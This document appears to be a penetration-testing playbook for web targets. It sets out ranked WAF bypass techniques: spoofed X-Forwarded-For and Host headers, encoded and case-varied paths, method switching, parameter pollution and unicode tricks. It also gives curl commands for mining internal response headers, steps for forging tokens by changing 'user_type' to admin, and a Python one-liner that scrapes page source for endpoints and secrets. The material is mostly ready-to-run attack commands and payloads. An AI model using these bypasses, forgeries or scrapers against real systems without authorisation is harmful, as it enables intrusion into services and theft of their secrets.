# ZDH Phase 2-3, 20: WAF Bypass + Header Mining + SSR Source Mining

## Phase 2 - WAF Fingerprinting & Bypass Classification

**Enterprise/GSRM-style WAF pattern:**
```
BLOCKED:  HTTP 200 with {"status":403,"message":"..."} or empty body
REAL:     HTTP 200 with actual JSON, OR HTTP 400/417/500 with JSON error
Rule: HTML 403 = WAF block. JSON 40x/50x = app processed = endpoint exists.
Empty 200 = catch-all WAF block = NOT real exposure.
```

**WAF bypass techniques (ranked by success rate):**
```bash
# 1. IP header spoofing
-H "X-Forwarded-For: 127.0.0.1"
-H "X-Real-IP: 10.0.0.1"
-H "True-Client-IP: 127.0.0.1"
-H "CF-Connecting-IP: 127.0.0.1"

# 2. Path obfuscation
/actuator%2fenv        # URL encode slash
/actuator/./env        # dot segment
/actuator//env         # double slash
//actuator/env         # leading double slash
/ACTuator/env          # case variation

# 3. Method switch
OPTIONS /admin/         # sometimes bypasses auth
HEAD /actuator/env      # headers only, may not trigger WAF body inspection
TRACE /                 # reveals proxy chain

# 4. Content-Type manipulation
-H "Content-Type: application/x-www-form-urlencoded"  # instead of JSON
-H "Content-Type: text/xml"  # triggers XML parser (XXE opportunity)

# 5. Parameter pollution (send same param twice)
?id=1&id=2             # WAF sees first, app processes second
POST: param=safe&param=<payload>

# 6. Unicode normalization bypass
/admin%ef%b8%8f/       # Unicode variation selector
/ａdmin/               # fullwidth chars (U+FF41)

# 7. Internal IP as Host header
-H "Host: 10.0.0.1"    # some reverse proxies route differently
```

## Phase 3 - Response Header Mining (Zero-Effort High-Value Intel)

**Every HTTP response header is a finding opportunity. Run on ALL live hosts:**

```bash
curl -sI https://<target>/ 2>&1 | head -50
curl -sI https://api.<target>/ 2>&1 | head -50
curl -sI https://m.<target>/ 2>&1 | head -50
```

**High-value headers to extract:**

| Header | What it leaks |
|--------|---------------|
| `via-<company>-gateway` | Internal gateway name + Java class path |
| `header-cmdb-name` | CMDB identifier for PCI/prod infrastructure |
| `header-cmdb-app-name` | Application name in asset inventory |
| `x-internal-tag` | Internal service routing tag |
| `x-terminal-config` | A/B test flags (product roadmap) |
| `x-apisix-upstream-status` | Backend health (500 = crashed upstream) |
| `x-gw-traceid` | Distributed trace ID |
| `server: APISIX/x.y.z` | Gateway version (search CVEs) |
| `server: nginx/1.x` | Nginx version (search CVEs) |
| `x-powered-by` | Framework version disclosure |
| `biz-code` | Internal business logic routing code |
| `frsys` | Internal routing flag |
| `via` | Proxy chain disclosure |

**Token extraction and forging:**
```bash
# Many apps use non-standard token formats: <prefix>.<base64-payload>.<signature>
# Example: token: PREFIX.eyJ1c2VyX3R5cGUiOiJndWVzdCIsInVzZXJfaWQiOjB9.abcdef12
echo "eyJ1c2VyX3R5cGUiOiJndWVzdCIsInVzZXJfaWQiOjB9" | base64 -d
# {"user_type":"guest","user_id":0}
# user_type=guest -> try forging user_type=admin or user_type=internal
# Signature is weak (truncated hash) -> try brute force or null-key forge
```

## Phase 20 - SSR Page Source Mining

```bash
curl -s "https://m.<target>/<country>/" | python3 -c "
import sys, re
html = sys.stdin.read()
print('=== ENDPOINTS ===')
for m in re.findall(r'[\"\x27](/[a-z][a-z0-9/._-]{3,60})[\"\x27]', html):
    print(m)
print('=== SECRETS ===')
for m in re.findall(r'[\"\x27]([A-Za-z0-9+/]{20,}={0,2})[\"\x27]', html):
    print(m)
"
```

**What to look for:**
1. Full API endpoint list (inline JSON config -> 149 endpoints in one page)
2. Bot detection blacklists (exact bypass strings)
3. OAuth client IDs (Google, Facebook, Apple)
4. reCAPTCHA / hCaptcha site keys
5. Internal feature flags / A/B test config (product roadmap)
6. CDN bucket names / S3 bucket names
7. Internal app IDs (APM, monitoring, error tracking)
8. Map SDK keys (AMap/Gaode, Mapbox, Google Maps)
9. Environment indicators (prod vs staging vs dev)
